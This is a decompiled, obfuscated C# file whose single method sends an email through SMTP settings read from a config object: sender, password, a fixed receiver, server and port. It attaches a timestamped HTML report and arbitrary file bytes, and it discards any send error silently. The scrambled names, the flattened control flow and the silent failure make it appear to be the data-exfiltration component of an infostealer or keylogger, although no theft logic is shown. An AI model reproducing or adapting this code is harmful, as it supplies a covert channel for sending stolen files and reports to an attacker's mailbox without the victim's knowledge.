using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Net.Mime;
using System.Text;
using ppkr;

namespace RwUya;

public class _2M9sod5dN
{
	public static void rY5NTIcDkxo(string ZmLgBD2Nn, string dQ6SwVzksL, List<aCYVob> elqnYMZ = null, int GqOVyb = 0)
	{
		int num = 0;
		MailMessage mailMessage = default;
		List<aCYVob>.Enumerator enumerator = default;
		Attachment attachment = default;
		MemoryStream memoryStream = default;
		ContentType contentType = default;
		byte[] bytes = default;
		MailAddress mailAddress = default;
		MailAddress to = default;
		while (true)
		{
			if (num == 18)
			{
				mailMessage.Body = "";
				num = 19;
			}
			if (num == 23)
			{
				if (elqnYMZ.Count <= 0)
				{
					break;
				}
				num = 24;
			}
			if (num == 9)
			{
				mailMessage.IsBodyHtml = false;
				num = 10;
			}
			if (num == 8)
			{
				if (!(dBDNalx6.SmtpAttach & (GqOVyb == 0)))
				{
					goto IL_01df;
				}
				num = 9;
			}
			if (num == 24)
			{
				enumerator = elqnYMZ.GetEnumerator();
				num = 25;
			}
			if (num == 15)
			{
				attachment = new Attachment(memoryStream, contentType);
				num = 16;
			}
			if (num == 14)
			{
				contentType.MediaType = "text/html";
				num = 15;
			}
			if (num == 11)
			{
				memoryStream = new MemoryStream(bytes);
				num = 12;
			}
			if (num == 7)
			{
				mailMessage.Subject = ZmLgBD2Nn;
				num = 8;
			}
			if (num == 10)
			{
				bytes = Encoding.UTF8.GetBytes(dQ6SwVzksL);
				num = 11;
			}
			if (num == 19)
			{
				goto IL_03f9;
			}
			if (num == 20)
			{
				goto IL_01df;
			}
			goto IL_01f6;
			IL_03f9:
			if (elqnYMZ == null)
			{
				break;
			}
			num = 23;
			goto IL_040b;
			IL_01df:
			mailMessage.IsBodyHtml = true;
			num = 21;
			goto IL_01f6;
			IL_021e:
			if (num == 1)
			{
				if (!string.IsNullOrWhiteSpace(dQ6SwVzksL))
				{
					goto IL_0207;
				}
				num = 2;
			}
			if (num == 12)
			{
				contentType = new ContentType();
				num = 13;
			}
			if (num == 17)
			{
				mailMessage.Attachments.Add(attachment);
				num = 18;
			}
			switch (num)
			{
			case 2:
				return;
			case 4:
				mailAddress = new MailAddress(dBDNalx6.SmtpSender);
				num = 5;
				break;
			}
			if (num == 16)
			{
				attachment.ContentDisposition.FileName = ZmLgBD2Nn + "_" + DateTime.Now.ToString("yyyy_MM_dd_HH_mm_ss") + ".html";
				num = 17;
			}
			if (num == 5)
			{
				mailMessage = new MailMessage(mailAddress, to);
				num = 6;
			}
			if (num == 21)
			{
				mailMessage.Body = dQ6SwVzksL;
				num = 22;
			}
			if (num == 6)
			{
				memoryStream = null;
				num = 7;
			}
			if (num == 13)
			{
				contentType.Name = ZmLgBD2Nn + "_" + DateTime.Now.ToString("yyyy_MM_dd_HH_mm_ss") + ".html";
				num = 14;
			}
			if (num == 22)
			{
				goto IL_03f9;
			}
			goto IL_040b;
			IL_0207:
			to = new MailAddress(dBDNalx6.SmtpReceiver);
			num = 4;
			goto IL_021e;
			IL_040b:
			if (num == 0)
			{
				num = 1;
			}
			if (num != 25)
			{
				continue;
			}
			try
			{
				while (enumerator.MoveNext())
				{
					aCYVob current = enumerator.Current;
					mailMessage.Attachments.Add(new Attachment(new MemoryStream(current.FileBytes), current.Filename, current.MimeType));
				}
			}
			finally
			{
				((IDisposable)enumerator/*cast due to constrained. prefix*/).Dispose();
			}
			break;
			IL_01f6:
			if (num == 3)
			{
				goto IL_0207;
			}
			goto IL_021e;
		}
		SmtpClient smtpClient = new SmtpClient();
		NetworkCredential credentials = new NetworkCredential(dBDNalx6.SmtpSender, dBDNalx6.SmtpPassword);
		smtpClient.Host = dBDNalx6.SmtpServer;
		smtpClient.EnableSsl = dBDNalx6.SmtpSSL;
		smtpClient.UseDefaultCredentials = false;
		smtpClient.Credentials = credentials;
		smtpClient.Port = dBDNalx6.SmtpPort;
		try
		{
			smtpClient.Send(mailMessage);
		}
		catch
		{
		}
		finally
		{
			mailMessage.Attachments.Dispose();
			memoryStream?.Dispose();
		}
	}
}
